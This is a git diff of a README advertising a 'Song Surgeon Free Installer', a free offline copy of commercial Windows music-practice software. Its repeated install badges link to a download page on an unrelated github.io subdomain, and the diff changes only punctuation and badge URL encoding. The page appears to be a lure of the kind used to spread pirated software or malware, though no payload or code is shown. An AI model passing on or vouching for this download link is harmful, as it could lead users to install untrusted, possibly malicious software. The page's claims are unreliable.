@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Music+Practice-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Song Surgeon Free Installer** — Song Surgeon is a Windows music practice and learning software that slows down audio, changes pitch, isolates instruments using AI stem separation, and provides loop and bookmark functions for learning songs by ear or transcribing music.. Works without internet access, no account required. Full offline installation.
+**💻 Song Surgeon Free Installer** — Song Surgeon is a Windows music practice and learning software that slows down audio, changes pitch, isolates instruments using AI stem separation, and provides loop and bookmark functions for learning songs by ear or transcribing music. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Song Surgeon](https://img.shields.io/badge/⬇_Install_Song%20Surgeon-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Song Surgeon](https://img.shields.io/badge/⬇_Install_Song+Surgeon-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Song Surgeon is a Windows music practice and learning software that slows down a
 
 <div align="center">
 
-[![⬇ Install Song Surgeon](https://img.shields.io/badge/⬇_Install_Song%20Surgeon-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Song Surgeon](https://img.shields.io/badge/⬇_Install_Song+Surgeon-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Song Surgeon is a Windows music practice and learning software that slows down a
 
 ---
 
-**Song Surgeon Free Installer** — Song Surgeon is a Windows music practice and learning software that slows down audio, changes pitch, isolates instruments using AI stem separation, and provides loop and bookmark functions for learning songs by ear or transcribing music.. Install without internet connection today!
+**Song Surgeon Free Installer** — Song Surgeon is a Windows music practice and learning software that slows down audio, changes pitch, isolates instruments using AI stem separation, and provides loop and bookmark functions for learning songs by ear or transcribing music. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Song Surgeon](https://img.shields.io/badge/⬇_Install_Song%20Surgeon-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Song Surgeon](https://img.shields.io/badge/⬇_Install_Song+Surgeon-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
